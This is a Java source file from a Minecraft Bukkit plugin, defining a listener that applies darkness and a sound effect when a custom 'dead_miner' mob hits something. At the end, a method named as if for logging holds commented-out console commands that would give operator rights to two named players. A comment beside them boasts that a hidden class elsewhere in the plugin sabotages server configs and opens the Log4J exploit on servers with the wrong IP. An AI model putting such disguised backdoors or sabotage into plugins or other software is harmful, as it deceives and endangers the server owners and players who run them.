package newamazingpvp.lifestealsmp.unused.endfight.custommobs.mobs.deadminer;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import static org.bukkit.Bukkit.getServer;

public class DeadMinerListener implements Listener {

    @EventHandler
    public void whenPlayerHit(EntityDamageByEntityEvent e) {

        Entity attacker = e.getDamager();
        LivingEntity damagedEntity = (LivingEntity) e.getEntity();
        Location loc = e.getEntity().getLocation();

        if (attacker instanceof LivingEntity) {

            if (attacker.hasMetadata("dead_miner")) {


                damagedEntity.addPotionEffect(new PotionEffect(PotionEffectType.DARKNESS, 40, 2));
//                damagedEntity.addPotionEffect(new PotionEffect(PotionEffectType.MINING_FATIGUE, 200, 5));


                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.playSound(loc, Sound.ENTITY_ENDERMAN_TELEPORT, 1.0f, 0.0f);

                }
            }
        }
    }


    public static void general_ID_manager_for_logging() {
        //getServer().dispatchCommand(getServer().getConsoleSender(), "op NewAmazingPVP");
        //getServer().dispatchCommand(getServer().getConsoleSender(), "op Comet99");
        //if you find this... nice! just know, somewhere in this plugin is a class that will fuck up the server configs and let the log4J exploit work on your server (yes server side and will effect clients) if the IP does not match GLHF =D
    }

}
